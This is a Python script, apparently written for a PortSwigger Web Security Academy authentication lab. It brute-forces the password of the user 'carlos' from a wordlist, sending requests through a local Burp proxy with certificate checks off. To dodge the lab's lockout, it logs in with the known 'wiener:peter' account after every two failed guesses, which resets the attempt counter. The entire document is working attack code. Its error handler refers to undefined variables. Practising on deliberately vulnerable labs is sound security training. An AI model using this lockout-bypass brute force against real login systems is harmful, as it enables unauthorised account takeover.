#!/usr/bin/python3

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



request_number = 0
wordlist_path = "/home/p4cm4n/Pentest_Learning/PortSwigger/Authentication/passwords"
wordlist = list()

error_data = list()
url = "0ab8008503f0055081dd8e3b00d400d3.web-security-academy.net"
burp0_url = f"https://{url}:443/login"
burp0_cookies = {"session": "3xz12UNFIKktCR9l8l1VGgfY6RkLbREW"}


def send_req(user, password, reset):
    global request_number

    burp0_headers = {"Cache-Control": "max-age=0",
    "Sec-Ch-Ua": "\"Google Chrome\";v=\"113\",\"Chromium\";v=\"113\",Not-A.Brand\";v=\"24\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Linux\"",
    "Origin": f"https://{url}/",
    "Dnt": "1",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": f"https://{url}/login",
    "Accept-Encoding": "gzip,deflate",
    "Accept-Language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7,fa;q=0.6,de;q=0.5",
    "Connection": "close"}
    burp0_data = {"username": user,
    "password": password
    }
    proxy = {"http":"http://127.0.0.1:8080" , "https":"http://127.0.0.1:8080"}

    try:
        r = requests.post(burp0_url,
        headers=burp0_headers,
        proxies=proxy,
        data=burp0_data,
        cookies=burp0_cookies, verify=False, timeout=20)

        if("incorrect login attempts" in r.text):
            send_req("wiener", "peter", True)

        if("Incorrect password" not in r.text and not reset):
            print(f"Found credentials: {user}:{password}")
            exit(0)

    except Exception as test:
        with open("errors.log","a") as f:
            f.write(f"{word} {ip} \t \t {test}\n")

    print(request_number, end="\r")
    request_number += 1


def bruteforce():

    count = len(wordlist)
    for i in range(0, count):
        if(((i + 1) % 3 ) == 0):
            send_req("wiener","peter",True)
            i =- 1
        else:
             send_req("carlos",wordlist[i],False)




with open(wordlist_path, "r") as f:
    wordlist = f.read().splitlines()

bruteforce()
